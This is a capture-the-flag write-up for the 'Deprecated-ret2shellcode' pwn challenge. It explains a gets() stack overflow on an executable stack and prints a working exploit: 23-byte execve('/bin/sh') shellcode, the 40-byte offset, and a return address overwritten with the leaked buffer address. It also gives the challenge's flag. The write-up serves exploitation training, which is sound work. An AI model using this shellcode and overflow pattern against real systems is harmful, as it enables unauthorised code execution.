---
title: "Deprecated-ret2shellcode"
ctf: "Pwny-CTF"
category: "pwn"
difficulty: "medium"
points: 300
techniques: ["format-string", "ret2libc", "rop", "shellcode", "stack-canary", "pie-bypass", "nx-bypass"]
tools: ["pwntools", "checksec", "netcat", "python"]
keywords: ["Deprecated-ret2shellcode", "Pwny-CTF", "pwn", "format-string", "ret2libc", "rop", "shellcode", "stack-canary", "pie-bypass", "nx-bypass", "pwntools", "checksec", "netcat", "python", "https", "canary"]
status: "solved"
has_script: true
source: "Pwny-CTF/CHALLENGES/Pwn/Deprecated-ret2shellcode/notes.md"
---

# Deprecated-ret2shellcode (Pwny-CTF, pwn)

## Summary
Challenge **Deprecated-ret2shellcode** from the Pwny-CTF CTF, pwn category. Main technique: format-string. Recognize: checksec RWX / Stack Executable + a way to know the address of the buffer (leak %p or no ASLR) -> ret2shellcode.

## Statement and artefacts
**Note:** Shellcode was not covered at this meeting, but you can consult [last year's slides](https://sigpwny.com/presentation-content/FA2021/07-pwn-I.pdf) and the internet if you want to give it a shot anyway!

Can you pwn this program and read flag.txt?

`nc chal.sigpwny.com 1377`

**Provided files / artifacts:**
- `work/Dockerfile (file, 601 B)`
- `work/challenge (file, 19.0 KB)`
- `work/challenge_patched (file, 19.0 KB)`

## Recognition signals
- Signal: If NX was enabled (non-executable stack), this plan would fall -> ROP/ret2libc instead.

## Resolution method
1. **Binary**

- `main()`: `char name[32];`, **displays the buffer address** (`printf("... name is located at %p", name)`), then `gets(name)` (unbounded).
- `checksec`: **Partial RELRO**, **No canary**, **No PIE**, but above all **Stack Executable / RWX** → you can execute code placed on the stack.
- The source gives the plan: shellcode in the buffer + overwrite the return address with the buffer address, parse the address displayed via pwntools.

1. **Leak**: read the 1st line and extract the address of `name` (the program gives it, no need for format string). Same connection → stack ASLR is canceled for this run.
2. **Shellcode** execve(`/bin/sh`) 64 bits (23 bytes) placed **at the start** of the buffer.
3. **Offset 40** up to saved RIP: 32 (`name`) + 8 (saved RBP).
4. Saved RIP = `p64(name_addr)` → at `ret`, execution jumps to shellcode → **shell** → `cat flag.txt`.

```python
name_addr = leak_hex_int(rl(), True)[0]
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"  # execve /bin/sh
payload = shellcode + b"A"*(32-len(shellcode)) + b"B"*8 + p64(name_addr)
sl(payload)
```

## Solve script
Script path: `scripts/pwny.py`

## Flag
sigpwny{can_this_pwn_series_get_any_harder?}

## Lessons and reusable patterns
- Recognize: checksec RWX / Stack Executable + a way to know the address of the buffer (leak %p or no ASLR) -> ret2shellcode.
- The leak and the exploit go in the same connection: the stack address is only valid for this process. Read with recvline, not recvall.
- Hard shellcode (23 B) or asm(shellcraft.sh()) (requires context.arch='amd64'). Put it before the padding so that it fits within 32 bytes.
- If NX was enabled (non-executable stack), this plan would fall -> ROP/ret2libc instead.
- Almost identical to 3 - Execute and Bug Bounty 5 (here the address is directly displayed by the program).
